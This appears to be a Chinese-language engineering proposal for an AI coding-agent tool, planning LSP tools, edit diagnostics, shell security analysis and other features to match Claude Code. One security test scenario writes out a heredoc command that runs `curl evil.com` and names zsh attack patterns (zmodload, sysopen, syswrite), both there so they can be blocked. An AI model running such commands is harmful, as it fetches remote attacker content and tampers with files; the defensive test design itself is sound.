# Proposal: 诊断工具能力差距闭环 — 对齐 clawcode (Claude Code v2.1.88)

**Change ID:** devrix-diagnostic-tools-parity
**Demand ID:** DM-20260616-003
**Status:** S7_Archived
**Version:** v1.0 (13 能力 + 7 域 t-registry + S5 验收 + 全量单测全绿)
**域:** D1 / D2 / D3 / D4 / D5 / D6 + tool-security 横切

---

> **能力别名前缀 (Capability Aliases)**
>
> 本 change 遵循 DSAFT 域-场景-活动-功能-任务五层命名作为权威 ID（详见 `openspec/specs/project/master.md` §1.2 + `docs/methodology/dsaft-methodology.md`）。G1-G6 / A1-A7 是 S2 阶段为方便对照 `docs/reference/clawcode-diagnostic-tools-analysis.md` 而保留的需求侧别名前缀。两者一一映射如下（按 DSAFT Activity 升序）：
>
> | DSAFT Activity | Alias | 域 | 能力 |
> |----------------|-------|----|------|
> | D1-S2-A02-PersistTranscript | A3 | D1 | 会话转录持久化 |
> | D2-S4-A01-ToolRegister | G1 | D2 | LSP 代码智能工具 |
> | D2-S6-A02-TruncateError | A7 | D2 | 共享错误栈截断 |
> | D2-S6-A03-AnalyzeWindow | A5 | D2 | 上下文窗口分析 |
> | D3-S3-A02-ErrorMapping | A6 | D3 | LLM 错误分类 |
> | D4-S11-A02-ForkAgent | G5 | D4 | 自由分叉子代理 |
> | D4-S12-A03-NotifyChild | G3 | D4 | 后台任务完成通知 |
> | D4-S13-A02-IsolateWorktree | G5 | D4 | (G5 worktree 隔离子能力) |
> | D5-S23-A02-TrackDiagnostics | G6 | D5 | 诊断跟踪器 |
> | D5-S23-A03-RunDoctor | A1 | D5 | /doctor 自检命令 |
> | D5-S23-A04-FaultInject | A4 | D5 | 故障注入 |
> | D5-S24-A02-ConfigureDebugFilter | A2 | D5 | Debug 日志分类过滤 |
> | D6-S11-A02-VerifyPlanExec | G4 | D6 | 实现后自动验证 |
> | TOOL-SEC-2-A02-ShellASTPolicy | G2 | tool-security | Bash AST 安全分析器 |

---

## 1. Background

devrix 当前诊断工具能力与 clawcode (Claude Code v2.1.88) 存在 **6 项核心能力差距**（G1-G6 别名 → D2-S4/D4-S11/D4-S12/D4-S13/D5-S23/D6-S11/D2-S6 + TOOL-SEC 场景）和 **7 项附加诊断特性缺口**（A1-A7 别名 → D5-S23/D5-S24/D1-S2/D2-S6 + D3-S3）。最大差距为 LSP 代码智能工具（D2-S4-A01，完全缺失）与文件诊断追踪（D5-S23-A02，完全缺失）。详细背景见 `demand.md` §1，分析依据见 `docs/reference/clawcode-diagnostic-tools-analysis.md`。

参考 devrix 历史分批模式（`devrix-observability-enhancement` → `-p1` → `-p2`），本提案采用 **umbrella + sub-change** 模式：v1.0（当前 change）产出统一规范需求，v1.1/v1.2/v1.3 三个 sub-change 分别承接 P0/P1/P2 实现。

## 2. Problem Statement

| # | 问题 | 触发频次 | 用户痛感 |
|---|------|---------|---------|
| P1 | LLM 排错只能靠 grep + 记忆，无 IDE 级代码理解（D2-S4-A01, alias G1） | 高频 | 改函数不知谁依赖、不知完整调用栈 |
| P2 | 编辑文件不知是否引入新错（D5-S23-A02, alias G6） | 高频 | 改完等 CI/build 反馈，循环时间长 |
| P3 | 复杂 bash 命令沙箱误杀或漏判（TOOL-SEC-2-A02, alias G2） | 中频 | heredoc/zsh 攻击面覆盖不全 |
| P4 | S4-Gate 靠人工 Review（D6-S11-A02, alias G4） | 每次合并 | reviewer 负担重 |
| P5 | 后台任务无完成通知（D4-S12-A03, alias G3） | 中频 | 模型轮询浪费 token |
| P6 | Fork 子代理受 DAG 限制（D4-S11-A02, alias G5） | 低频 | 探索性排查需要自由分叉 |
| P7 | 无 `/doctor`、无 debug 过滤、无上下文窗口可视化（D5-S23-A03 / D5-S24-A02 / D2-S6-A03, alias A1/A2/A5） | 低频 | 故障定位效率低 |

## 3. Proposed Solution

### 3.1 总策略

**umbrella + sub-change 三阶段**：

```
v1.0 (本 change)  →  规范需求 (S1+S2) + Gherkin 草案
   │
   ├─ v1.1 sub-change-A (P0, D2-S4-A01 + D5-S23-A02 + D3-S3-A02 + D2-S6-A02, alias G1+G6+A6+A7)
   ├─ v1.2 sub-change-B (P1, TOOL-SEC-2-A02 + D6-S11-A02, alias G2+G4)
   └─ v1.3 sub-change-C (P2, D4-S12-A03 + D4-S11-A02 + D5-S23-A03 + D5-S24-A02 + D1-S2-A02 + D5-S23-A04 + D2-S6-A03, alias G3+G5+A1+A2+A3+A4+A5)
```

> **关于 D2 QueryLoop 位置：** 用户指出 D2 QueryLoop 位置错位（DM-020 半重构遗留）。
> 经核实 `loopFirst=true`（默认）下 D7 RunTurnLoop 已是主路径，此债务已独立为
> `devrix-queryloop-legacy-decommission` change（DM-20260617-001），
> 见 `openspec/tech-debt/queryloop-location.md` (TD-QL-LOC)。
> 本 change 内所有诊断工具能力**仅在 `loopFirst=true` 主路径下验证**，与 legacy 路径解耦。

### 3.2 域归属映射

| DSAFT Activity | Alias | 主域 | 横切域 | 备注 |
|----------------|-------|------|--------|------|
| D2-S4-A01-ToolRegister | G1 | D2 Context Engine | tool-security | 复用 ToolPool 注册 |
| TOOL-SEC-2-A02-ShellASTPolicy | G2 | tool-security | D5 observability | 错误分类 D3-S3-A02 关联 |
| D4-S12-A03-NotifyChild | G3 | D4 Multi-Agent | D1 Communication | 跨任务类型统一 |
| D6-S11-A02-VerifyPlanExec | G4 | D6 Evolution | D5 observability | 复用 D6 Eval 框架 |
| D4-S11-A02-ForkAgent + D4-S13-A02-IsolateWorktree | G5 | D4 Multi-Agent | — | worktree 隔离默认 |
| D5-S23-A02-TrackDiagnostics | G6 | D5 Observability | D2 Context Engine | 埋点在 edit_file/write_file |
| D5-S23-A03-RunDoctor | A1 | D5 Observability | D1 Communication | JSON 报告 |
| D5-S24-A02-ConfigureDebugFilter | A2 | D5 Observability | — | tracer/logger 子句 |
| D1-S2-A02-PersistTranscript | A3 | D1 Communication | — | JSONL + --continue |
| D5-S23-A04-FaultInject | A4 | D5 Observability | D6 Evolution | 测试 harness |
| D2-S6-A03-AnalyzeWindow | A5 | D2 Context Engine | — | 按类别 token 分解 |
| D3-S3-A02-ErrorMapping | A6 | D3 LLM Gateway | tool-security | 20+ sentinel error |
| D2-S6-A02-TruncateError | A7 | tool-security | — | shared/errors helper |

### 3.3 v1.1 sub-change-A 范围草案（P0）

**主题:** LSP 代码智能工具 (D2-S4-A01) + 文件诊断追踪 (D5-S23-A02) + 错误分类接入 (D3-S3-A02) + 堆栈截断 (D2-S6-A02)

- `internal/layers/contextengine/tool/lsp/` — gopls/tsserver adapter (P0 ops: goToDefinition / findReferences / incomingCalls)
- `internal/layers/observability/diagnose/tracker/` — 500 文件 LRU + edit_file/write_file 埋点
- `internal/layers/llmgateway/errors/` — 错误分类引擎接入
- `internal/shared/errors/shortstack.go` — `shortErrorStack(err, 5)` helper

**预计 T 层新增（PLANNED）：**
- D2-S4-A01-T01 LSP ToolPool 注册
- D2-S4-A01-T02 goToDefinition 返回行号+上下文
- D2-S4-A01-T03 findReferences 跨文件
- D2-S4-A01-T04 incomingCalls 调用方列表
- D2-S4-A01-T05 LSP server LRU 淘汰
- D5-S23-A02-T01 诊断快照拍取
- D5-S23-A02-T02 diff 输出新错误
- D5-S23-A02-T03 500 文件 LRU 去重

### 3.4 v1.2 sub-change-B 范围草案（P1）

**主题:** Bash AST 安全 (TOOL-SEC-2-A02) + 实现后自动验证 (D6-S11-A02)

- tool-security 引入 `mvdan.cc/sh` AST 解析
- heredoc 内容单独审计
- zsh 攻击面 ≥20 种模式（zmodload / sysopen / syswrite / =cmd 等）
- D6 Eval S4-Gate：实现完成 → 对照 plan.md 逐项验证 → JSON 差异报告
- 错误分类引擎补全至 ≥20 种 LLM 错误码

### 3.5 v1.3 sub-change-C 范围草案（P2）

**主题:** 后台任务通知 (D4-S12-A03) + 自由分叉 (D4-S11-A02 + D4-S13-A02) + 7 项附加诊断特性

- D4 fork/freefork：脱离 DAG 即兴分叉 + worktree 隔离 + SendMessage channel
- D4 RunAgentLoop：后台任务完成事件推送
- `/doctor` 自诊断命令
- `--debug=api,hooks,telemetry` 分类开关
- 上下文窗口按类别 token 分解 + 可视化
- 故障注入 harness
- JSONL 会话转录持久化 + `--continue` 恢复

## 4. Success Metrics

| # | 指标 | 基线 | 目标 |
|---|------|------|------|
| M1 | LLM 排错任务端到端完成率（含 LSP 调用的回合） | 待测 | 提升 ≥30%（v1.1 验证） |
| M2 | S4-Gate 自动化验证覆盖率（plan 项 vs 自动检查项） | 0% | ≥80%（v1.2 验证） |
| M3 | 文件编辑 → 发现新错误的平均延迟 | 60s（CI 反馈） | <10s（v1.1 验证） |
| M4 | 后台任务模型调用轮询 token 浪费 | 待测 | 减少 ≥50%（v1.3 验证） |
| M5 | 未分类错误率（错误分类引擎） | 待测 | <5%（v1.2 验证） |
| M6 | 跨域 import cycle | 0 | 0（layering gate 强制） |
| M7 | P0 T 层覆盖率 | 待测 | 100% PASS（各 sub-change S5 验收） |

## 5. Implementation Plan

**v1.0（本 change）— 规范需求阶段（不实现）**

| 步骤 | 产出物 | 状态 |
|------|--------|------|
| S1 需求 | `demand.md` | ✅ 本次完成 |
| S2 提案 | `proposal.md` + `.openspec.yaml` | ✅ 本次完成 |
| S2 附录 | Gherkin 需求草案（proposal §A） | ✅ 本次完成 |
| S3 设计 | `design.md` + `specs/<module>/spec.md` | ❌ 留给 sub-change |
| S4-S6 | 实现 + 验收 + 归档 | ❌ 留给 sub-change |

**sub-change v1.1 / v1.2 / v1.3 — 各自走 S3-S6 流程**

| Sub-change | DM ID | 分支 | 优先级 |
|------------|-------|------|--------|
| v1.1 sub-A (D2-S4-A01 + D5-S23-A02 + D3-S3-A02 + D2-S6-A02, alias G1+G6+A6+A7) | DM-20260617-NN1 | `feat/devrix-diagnostic-tools-A` | P0 |
| v1.2 sub-B (TOOL-SEC-2-A02 + D6-S11-A02, alias G2+G4) | DM-20260617-NN2 | `feat/devrix-diagnostic-tools-B` | P1 |
| v1.3 sub-C (D4-S12-A03 + D4-S11-A02 + 7 add-ons, alias G3+G5+A1+A2+A3+A4+A5) | DM-20260617-NN3 | `feat/devrix-diagnostic-tools-C` | P2 |

> **D2 QueryLoop 债务** 已独立为 `devrix-queryloop-legacy-decommission` (DM-20260617-NN0)，见 `openspec/tech-debt/queryloop-location.md` (TD-QL-LOC)。本 change 不混合处理。

- 每个 sub-change 走完整 S3-Gate（design review）+ S4-Gate（code review）
- 每个 sub-change 单独归档到 `openspec/archive/<date>-<change-id>/`

## 6. Risks & Mitigations

详见 `demand.md` §6 完整风险表。核心风险摘要：

| 风险 | 影响 | 缓解 |
|------|------|------|
| LSP server 进程数失控 | OOM | 单 workspace ≤4 server + LRU 淘汰 |
| 文件诊断 linter 阻塞编辑 | 延迟 5s→60s | 异步化 OnEditComplete，编辑主路径不阻塞 |
| Tree-sitter 引入 CGO 依赖 | 二进制 +200KB | v1.2 评估 `mvdan.cc/sh` 纯 Go 实现优先 |
| 自由分叉破坏 DAG 隔离保证 | session 串扰 | freefork 子代理默认 worktree 隔离 (D4-S13-A02) |
| 跨域 import 爆炸 | 依赖环 | layering gate + `internal/shared/` 横切接口 |

## 7. Out of Scope

完整列表见 `demand.md` §7。摘要：

- 本 change 不实现（仅规范）
- 不引入新 LLM provider / 通信协议 / 持久化后端
- 不动 D2 QueryLoop / D7 Turn 主路径
- 不覆盖 Python/Rust LSP server
- 不实现 clawcode 私有协议（如 `_claude_fs_right:`）

## 8. Decision

### Decision: Umbrella + sub-change 三阶段拆分

| 方案 | 优点 | 缺点 |
|------|------|------|
| A. 单 change 涵盖全部 13 项 | 统一提案；一次 PR | 巨型 PR 难 review；混合 P0/P1/P2 优先级；blast radius 大 |
| B. **Umbrella v1.0 + 3 个 sub-change**（推荐） | 与 observability-enhancement 历史模式一致；P0 优先交付；sub-change 各自独立 review | 需要手动维护跨 sub-change 依赖关系 |
| C. 13 个 sub-change（每项一个） | 粒度最细 | 管理开销大；D2-S4-A01 + D5-S23-A02 强耦合应合并 |

**选择:** B
**理由:** D2-S4-A01 (LSP) / D5-S23-A02 (Tracker) 强耦合（均涉及 D2 ToolPool + QueryLoop）、TOOL-SEC-2-A02 (Bash AST) / D6-S11-A02 (Verifier) 强耦合（均涉及安全/验证）、D4-S12-A03 (Notify) / D4-S11-A02 (FreeFork) 强耦合（均涉及 D4 异步）；3 个 sub-change 平衡粒度与耦合。模式与 DM-20260610-001..003 一致。

### Decision: LSP server 进程管理复用 D1 sandbox

| 方案 | 优点 | 缺点 |
|------|------|------|
| A. **复用 D1 sandbox**（推荐） | 沙箱一致；审计统一 | 启动延迟略增（sandbox 注入） |
| B. LSP server 进程独立管理 | 灵活 | 破坏沙箱一致性 |

**选择:** A
**理由:** LSP server 可执行用户代码（gopls 需读源码），必须受 sandbox 约束。

### Decision: 文件诊断追踪异步化

| 方案 | 优点 | 缺点 |
|------|------|------|
| A. **异步 OnEditComplete**（推荐） | 编辑主路径不阻塞 | 用户感知延迟 |
| B. 同步阻塞 | 结果即时 | 编辑延迟 5s→60s 不可接受 |

**选择:** A
**理由:** clawcode 同样异步；编辑主路径零延迟是硬性体验要求。

---

## 附录 A: Gherkin 需求草案

> 本附录为 S3 阶段 `specs/<module>/spec.md` 的种子。sub-change 在 S3 阶段将其转为正式 ADDED Requirements。
> 各 Scenario 标题前的 `DSAFT Activity (alias)` 标识权威 ID；alias 保留方便对照 clawcode 分析文档。

### A.1 D2-S4-A01 LSP Tool（草案 → v1.1 sub-A spec, alias G1）

```gherkin
Feature: LSP Code Intelligence Tool

  Scenario: goToDefinition returns source location
    Given a Go file defines function `Process(ctx context.Context)`
    When the LLM calls lsp.goToDefinition with {"file": "...", "line": 42, "col": 12}
    Then the tool returns the function's definition site with file path and line range
    And the result includes 1-3 lines of surrounding context

  Scenario: findReferences lists all usages across workspace
    Given a symbol `EngineEvent` is referenced in 7 files
    When the LLM calls lsp.findReferences with the symbol's location
    Then the tool returns a list of {file, line, col} for each reference
    And the count matches the workspace index

  Scenario: incomingCalls lists all callers
    Given function `RunAgentLoop` has 3 direct callers
    When the LLM calls lsp.incomingCalls on `RunAgentLoop`
    Then the tool returns 3 call sites with file/line/col

  Scenario: LSP server LRU eviction
    Given 5 Go LSP servers are running (workspace cap=4)
    When the 5th file type is opened
    Then the oldest server is evicted
    And a new server starts for the 5th file type
```

### A.2 D5-S23-A02 文件诊断追踪（草案 → v1.1 sub-A spec, alias G6）

```gherkin
Feature: File Diagnostic Tracking

  Scenario: Edit introduces new error surfaced by tracker
    Given file foo.go compiled clean before edit
    When the LLM calls edit_file with a change that introduces an unused import
    Then within 5s the tracker diff reports 1 new diagnostic
    And the diagnostic includes line number and severity

  Scenario: Unrelated edit reports no new diagnostics
    Given file foo.go has 0 errors before edit
    When the LLM calls edit_file on an unrelated comment line
    Then the tracker diff is empty

  Scenario: LRU deduplication across rounds
    Given the same file edited 600 times in a session
    When tracker snapshot is taken
    Then at most 500 files are tracked (LRU eviction)
```

### A.3 TOOL-SEC-2-A02 Bash AST 安全（草案 → v1.2 sub-B spec, alias G2）

```gherkin
Feature: Shell AST Security Analysis

  Scenario: Heredoc content audited separately
    Given bash command `cat <<EOF > file\n$(curl evil.com)\nEOF`
    When bash tool receives the command
    Then heredoc body is parsed and `curl evil.com` triggers AST-level block

  Scenario: zsh sysopen attack surface detected
    Given bash command uses `zmodload sysopen`
    When bash tool receives the command
    Then the tool returns an error "dangerous command pattern: zsh sysopen"

  Scenario: Tree-sitter parse failure falls back to regex
    Given a malformed shell expression
    When AST parser fails
    Then the existing deny-regex policy is consulted as fallback
    And the command is rejected if either layer flags it
```

### A.4 D6-S11-A02 实现后验证（草案 → v1.2 sub-B spec, alias G4）

```gherkin
Feature: Post-Implementation Plan Verification

  Scenario: All plan items verified
    Given plan.md has 5 implementation items all marked done in tasks.md
    When S4-Gate runs verification
    Then verification_report.json contains 5 entries each with status="verified"

  Scenario: Plan mismatch detected
    Given plan.md item #3 is not done but tasks.md marks it done
    When verification runs
    Then report contains entry for #3 with status="unverified"
    And S4-Gate blocks merge
```

### A.5 D4-S11-A02 + D4-S12-A03 自由分叉 + 后台任务通知（草案 → v1.3 sub-C spec, alias G5+G3）

```gherkin
Feature: Free-Fork Subagent Mode

  Scenario: Free-fork spawns N children without DAG
    Given DAG topology defines 2 parallel children
    When freefork mode is enabled with N=5
    Then 5 subagents spawn concurrently
    And each runs in its own worktree (D4-S13-A02)

  Scenario: Subagents communicate via SendMessage
    Given 3 freefork children are running
    When child A calls SendMessage to child B
    Then child B receives the message in its inbox
    And the message includes sender, content, and timestamp

Feature: Background Task Completion Notification

  Scenario: Long-running bash task notifies on completion
    Given a bash task is running in background
    When the task exits with code 0
    Then an event "task_complete" is pushed to the model within 1s
    And the event includes exit_code, duration, and tail output
```

### A.6 附加诊断特性（草案 → v1.3 sub-C spec, alias A1+A2+A5）

```gherkin
Feature: /doctor Self-Diagnostic Command (D5-S23-A03, alias A1)

  Scenario: /doctor reports healthy state
    Given install/version/config/context all green
    When user runs /doctor
    Then JSON report shows "status": "healthy" with all checks passed

  Scenario: /doctor detects stale config
    Given devrix.yaml references a missing LSP server path
    When user runs /doctor
    Then JSON report shows "lsp_server_path": "missing"

Feature: Debug Log Category Filter (D5-S24-A02, alias A2)

  Scenario: --debug=api enables only api logs
    Given the user passes --debug=api
    When runtime logs events
    Then only api.* category logs are emitted
    And hooks/telemetry logs are suppressed

Feature: Context Window Analyzer (D2-S6-A03, alias A5)

  Scenario: Token breakdown by category
    Given a session with 5 system + 20 user + 15 assistant messages
    When user runs /context analyze
    Then report shows per-category token count: system=N1, tools=N2, messages=N3
```

---

## 9. 检查清单（S2 完成确认）

- [x] `.openspec.yaml` 所有字段已填写
- [x] `dsaft_scenarios` / `dsaft_activities` 已标注
- [x] `proposal.md` 包含方案对比（§8 Decision × 3）+ 风险评估（§6）
- [x] T 层测试点预登记（v1.1 8 项；其余 sub-change 在各自 S2 补）
- [x] Out of Scope 已明确声明（§7）
- [x] Gherkin 草案附录（§A）覆盖 13 项能力
- [x] D2 QueryLoop 债务独立为 `devrix-queryloop-legacy-decommission`（DM-20260617-001），不混入本 change
- [x] 能力别名表（文档抬头）已建立，G1-G6 / A1-A7 与 DSAFT Activity 一一映射（docs 重构时引入）
